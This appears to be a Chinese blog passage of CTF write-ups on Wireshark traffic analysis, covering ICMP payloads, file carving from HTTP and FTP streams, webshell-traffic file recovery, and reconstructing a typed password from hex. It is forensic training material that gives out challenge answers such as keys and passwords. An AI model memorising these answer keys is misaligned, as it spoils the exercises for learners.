+<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><a class="tag-plugin colorful button" color="theme" title="WireShark流量分析" target="_blank" rel="noopener" href="https://security-1258894728.cos.ap-beijing.myqcloud.com/EmergencyResponse/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.7z"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg><span>WireShark流量分析</span></a>
+<h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><h4 id="扫描流量检测"><a href="#扫描流量检测" class="headerlink" title="扫描流量检测"></a>扫描流量检测</h4><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p>入侵者通过<code>ping</code>工具对局域网内一主机进行存活性扫描,flag 为入侵所发送的<code>16</code>字节的数据包内容。</p>
+<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>根据提示重点分为两个:</p>
+<ol>
+<li><code>Ping</code>命令的协议为<code>ICMP</code></li>
+<li><code>16</code>字节</li>
+</ol>
+<p>首先,筛选出协议为<code>ICMP</code>的流量包</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911187.png" data-fancybox="true"/></div></div>
+
+<p>浏览数据包,发现长度为<code>16</code>自己的数据</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911177.png" data-fancybox="true"/></div></div>
+
+<p>将数据进行<code>十六进制</code>转换可得<code>flag</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911656.png" data-fancybox="true"/></div></div>
+
+<h4 id="提取压缩包"><a href="#提取压缩包" class="headerlink" title="提取压缩包"></a>提取压缩包</h4><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p><code>key</code>为文本格式，你找得到吗？</p>
+<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><p>右键–&gt;追踪流–&gt;<code>TCP流</code>可看到更详细的信息</p>
+<p>第一个包去请求了一个密钥相关的<code>txt</code>,响应包中告诉我们密钥为<code>ZipYourMouth</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911276.png" data-fancybox="true"/></div></div>
+
+<p>接着看下一个流量包,发现他去下载了一个<code>flag.zip</code>的压缩包,也就是响应体是压缩包的数据我们只需要将响应体恢复成文件之后即可解压</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911715.png" data-fancybox="true"/></div></div>
+
+<p>选择对方给我方的响应对话,并且选择原始数据</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911256.png" data-fancybox="true"/></div></div>
+
+<p>然后点击另存为,文件名为<code>flag.zip</code>请求包里是什么名字我们就暂定为什么名字</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911075.png" data-fancybox="true"/></div></div>
+
+<p>发现压缩包无效,这是因为我们在保存的时候也把响应头等信息也给保存进去了,我们使用<code>010Editor</code>等工具.将多余的信息删掉即可</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911461.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911887.png" data-fancybox="true"/></div></div>
+
+<p>将其删掉,再次尝试打开.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911988.png" data-fancybox="true"/></div></div>
+
+<p>发现非压缩包.然后我们使用<code>WinRAR</code>尝试修复</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911385.png" data-fancybox="true"/></div></div>
+
+<p>打开修复后的压缩包发现显示密码错误,并且压缩包内的文件也不正常</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911285.png" data-fancybox="true"/></div></div>
+
+<p>这个时候我们可以直接将<code>pcap</code>包复制一份改名为<code>.zip</code>然后使用<code>WinRAR</code>修复即可</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912279.png" data-fancybox="true"/></div></div>
+
+<p>文件名也正确,输入密码得到<code>Flag</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912722.png" data-fancybox="true"/></div></div>
+
+<h4 id="关键字符提取"><a href="#关键字符提取" class="headerlink" title="关键字符提取"></a>关键字符提取</h4><h5 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h5><p>请找到流量包中的<code>flag</code>,格式为:<code>nctf&#123;&#125;</code></p>
+<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h5><p>随便选中一个数据流,按<code>Ctrl+F</code>,选择分组详情,搜索字符串:<code>nctf</code>可得<code>flag</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912195.png" data-fancybox="true"/></div></div>
+
+<h4 id="特殊字符提取"><a href="#特殊字符提取" class="headerlink" title="特殊字符提取"></a>特殊字符提取</h4><h5 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h5><p>请找到密码,组合为<code>flag</code>,格式为:<code>flag&#123;密码&#125;</code></p>
+<p>全是<code>TCP</code>协议,直接右键追踪<code>TCP</code>流</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912097.png" data-fancybox="true"/></div></div>
+
+<p>上来就发现了密码~好简单啊,并且就这一个包,然后提交<code>flag</code>发现不对.看特征是<code>Linux</code>输入密码.那有没有可能中间有密码输错了,然后<code>Delete</code>键的流量也被记录了.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912660.png" data-fancybox="true"/></div></div>
+
+<p>选择<code>HEX 转储</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912724.png" data-fancybox="true"/></div></div>
+
+<p>然后对照十六进制的<code>Ascii</code>码表,发现72对应的值确实是<code>r</code>也就是说这些确实是<code>ascii</code>码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912970.png" data-fancybox="true"/></div></div>
+
+<p>找到<code>7f</code>为<code>delete</code>,<code>0D</code>为回车.在<code>r</code>后面按了三下<code>delete</code>,<code>8</code>后面一下,<code>e</code>后面一下回车也就是:<code>backdoorm8te</code>	</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912673.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231921446.png" data-fancybox="true"/></div></div>
+
+<h3 id="文件提取"><a href="#文件提取" class="headerlink" title="文件提取"></a>文件提取</h3><h4 id="ISG-pcap"><a href="#ISG-pcap" class="headerlink" title="ISG.pcap"></a>ISG.pcap</h4><p>直接追踪<code>TCP</code>流,发现是一堆<code>Webshell</code>流量,看不懂没关系,我们直接找文件即可,在流三中发现了<code>x.tar.gz</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912125.png" data-fancybox="true"/></div></div>
+
+<p>那我们按照上面的方法,提取出压缩包,我们发现在响应体中最前面和最后面有<code>-&gt;| |&lt;-</code>那我们可以猜测这类似是一种包裹方式,而且也不属于压缩包的<a target="_blank" rel="noopener" href="http://doc.chacuo.net/filehead">头信息</a>,我们使用<code>010Editor</code>工具给他删掉</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912112.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912873.png" data-fancybox="true"/></div></div>
+
+<p>最后就这样</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912902.png" data-fancybox="true"/></div></div>
+
+<p>打开压缩包可得<code>flag</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913181.png" data-fancybox="true"/></div></div>
+
+<h4 id="final-pcap"><a href="#final-pcap" class="headerlink" title="final.pcap"></a>final.pcap</h4><p>打开后可发现<code>ftp</code>协议,直接追踪该流,流1可发现账号密码,保存一下</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913422.png" data-fancybox="true"/></div></div>
+
+<p>流2可以发现很明显的<code>Rar</code>头信息,提取出来</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913916.png" data-fancybox="true"/></div></div>
+
+<p>发现需要密码,拿流1中的密码去尝试,也解不开</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913657.png" data-fancybox="true"/></div></div>
+
+<p>接着往下看流,在流4中发现了<code>PNG</code>头</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913558.png" data-fancybox="true"/></div></div>
+
+<p>提取出来,删除多余的数据,然后发现图片打不开,接着往下看流,流5中发现<code>Base64</code>编码的内容</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913104.png" data-fancybox="true"/></div></div>
+
+<p>发现普通Base64无法解码,试一下解码为中文</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913302.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913907.png" data-fancybox="true"/></div></div>
+
+<p>解压出来后使用记事本打开<code>66666666666</code>文件发现是一堆乱码,那就用<code>010Editor.exe</code>打开看看</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913430.png" data-fancybox="true"/></div></div>
+
+<p>发现了<code>IHDR</code>很熟悉,上面看到过.发现是个<code>PNG</code>图片但是缺少了头信息,那我们随便找一个正常的<code>PNG</code>图片的数据复制过来</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913900.png" data-fancybox="true"/></div></div>
+
+<p>复制第一行即可,替换掉</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913191.png" data-fancybox="true"/></div></div>
+
+<p>得到<code>flag</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913495.png" data-fancybox="true"/></div></div>
+
+<h3 id="导出对象"><a href="#导出对象" class="headerlink" title="导出对象"></a>导出对象</h3><h4 id="流量中的线索-pcapng"><a href="#流量中的线索-pcapng" class="headerlink" title="流量中的线索.pcapng"></a>流量中的线索.pcapng</h4><p>选择文件—&gt;导出对象—&gt;<code>HTTP</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913612.png" data-fancybox="true"/></div></div>
+
+<p>打开发现是一堆<code>Base64</code>数据</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913762.png" data-fancybox="true"/></div></div>
+
+<p>使用<code>Base64</code>解码或前方加上<code>data:image/jpg;Base64,</code></p>
